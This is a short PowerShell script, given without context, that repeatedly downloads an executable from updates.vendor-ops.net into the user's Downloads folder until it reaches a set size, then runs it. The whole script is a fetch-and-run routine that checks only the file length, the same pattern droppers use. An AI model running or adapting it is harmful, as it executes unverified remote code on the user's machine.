$outPath=Join-Path $env:USERPROFILE 'Downloads\Install42.exe'
$need=3184128
$ok=$false
while(-not $ok){
  if(Test-Path -LiteralPath $outPath){$ln=(Get-Item -LiteralPath $outPath).Length}else{$ln=0}
  if($ln -eq $need){$ok=$true;break}
  Start-BitsTransfer -Source 'https://updates.vendor-ops.net/install.exe' -Destination $outPath
  if(-not $ok){Start-Sleep -Seconds 3}
}
Start-Process -FilePath $outPath
